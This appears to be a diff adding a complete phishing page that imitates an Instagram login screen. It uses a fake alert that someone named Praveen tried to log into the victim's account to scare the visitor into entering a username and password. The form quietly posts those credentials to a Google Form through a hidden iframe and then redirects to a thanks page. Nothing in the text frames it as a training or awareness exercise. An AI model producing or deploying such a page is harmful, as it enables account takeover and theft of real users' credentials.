@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <style>
+    *{
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: sans-serif;
+}
+body{
+    background: #ffffff;
+   
+}
+.containor{
+    margin-top: 5em;
+   display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    gap: 1rem;
+
+}
+.containor .logo{
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;  
+}
+.containor .logo img{
+    width: 50px;
+}
+.heading{
+    text-align: center;
+}
+.heading .main-text{
+    text-align: center;
+    font-size: 20px;
+    margin-bottom: 10px;
+}
+p{
+    font-size: 13px;
+    margin-bottom: 20px;
+}
+.heading-1{
+    margin: 5px;
+    padding: 5px;
+}
+.form{
+   
+    display: flex;
+    justify-content: center ;
+    align-items: center;
+    flex-direction: column;
+    gap: 1rem;
+    
+    
+}
+.form .input-field .Filed-2{
+    margin-top: 10px}
+
+
+ .input-field input{
+    width: 19em;
+    height: 4em;
+    padding: 10px;
+    border: 1px solid #ddd;
+    border-radius: 10px;
+}
+input:focus{
+    outline: none;
+    border: 2px solid #1c70dd;
+}
+.submit{
+    width: 19em;
+    height: 2.7rem;
+    padding: 10px;
+    background-color: #1c70dd;
+    color: white;
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
+    margin-top: 10px;
+} 
+.containor .forget{
+    margin-top: 10px;
+   
+}
+.forget a{
+     color: black;
+    text-decoration: none;
+     font-size: 15px;
+}
+
+
+   </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <div class="containor">
+        <div class="logo">
+            <img src="insta_logo.jpg" alt="">
+        </div>
+        <div class="text contant">
+            <div class="heading">
+                <h2 class="main-text">Praveen has trying to login your account. </h2>
+                <p>Please login to secure your account and report praveen.</p>
+            </div>
+        </div>
+        <div class="form">
+            <h4 class="heading-1">Log in to secure your Account.</h4>
+            
+            <form action="https://docs.google.com/forms/d/e/1FAIpQLSctmOuiXMSInjhfwanodn3g5GXN3Xcdy1lBW00tgdao8d9o7A/formResponse" method="POST" target="hidden_iframe" onsubmit="submitted=true;">
+
+                <div class="input-field">
+                    <input type="text" class="Filed-1" name="entry.968350899" placeholder="Username, email or mobile number" required><br>
+                    <input type="text" class="Filed-2" name="entry.1345952263" placeholder="Password" required>
+                </div>
+
+                <div class="login">
+                    <button class="submit" type="submit">Log in</button>
+                </div>
+            </form>
+
+            <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" 
+                    onload="if(submitted) { window.location.href='http://127.0.0.1:5500/thanks_page.html'; }"></iframe>
+        </div>
+
+        <div class="forget">
+            <a href="https://www.instagram.com/accounts/password/reset/?hl=en">Forget password?</a>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        var submitted = false;
+    </script>
+</body>
+</html>
